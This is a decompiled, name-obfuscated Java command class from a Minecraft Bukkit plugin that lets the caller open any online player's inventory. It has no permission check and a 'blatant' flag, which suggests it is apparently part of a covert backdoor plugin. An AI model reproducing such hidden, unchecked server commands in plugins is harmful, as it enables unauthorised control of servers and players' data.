/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.Inventory
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import java.util.concurrent.ExecutionException;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.Plugin;

public class InvseeCommand
extends Command {
    public InvseeCommand() {
        InvseeCommand llllllllllllllllllIlIIIIIIIlIIIl;
    }

    @Override
    public void execute(Core llllllllllllllllllIlIIIIIIIIlIlI, String llllllllllllllllllIlIIIIIIIIlIIl, String[] llllllllllllllllllIlIIIIIIIIIlIl, Player llllllllllllllllllIlIIIIIIIIIlll) {
        if (llllllllllllllllllIlIIIIIIIIIlIl.length <= 1) {
            llllllllllllllllllIlIIIIIIIIIlll.sendMessage(Settings.USAGE("invsee <player>"));
        } else {
            Player llllllllllllllllllIlIIIIIIIIllII = Bukkit.getServer().getPlayer(llllllllllllllllllIlIIIIIIIIIlIl[1]);
            if (llllllllllllllllllIlIIIIIIIIllII == null) {
                llllllllllllllllllIlIIIIIIIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllllllIlIIIIIIIIIlIl[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                llllllllllllllllllIlIIIIIIIIlIlI.getServer().getScheduler().runTaskAsynchronously((Plugin)llllllllllllllllllIlIIIIIIIIlIlI, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)llllllllllllllllllIlIIIIIIIIlIlI, () -> llllllllllllllllllIlIIIIIIIIIlll.openInventory((Inventory)llllllllllllllllllIlIIIIIIIIllII.getInventory())).get();
                    }
                    catch (InterruptedException | ExecutionException llllllllllllllllllIIllllllllIlll) {
                        // empty catch block
                    }
                });
                llllllllllllllllllIlIIIIIIIIIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You are now viewing ").append(Settings.RED).append(llllllllllllllllllIlIIIIIIIIllII.getName()).append("'s").append(Settings.WHITE).append(" inventory."))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

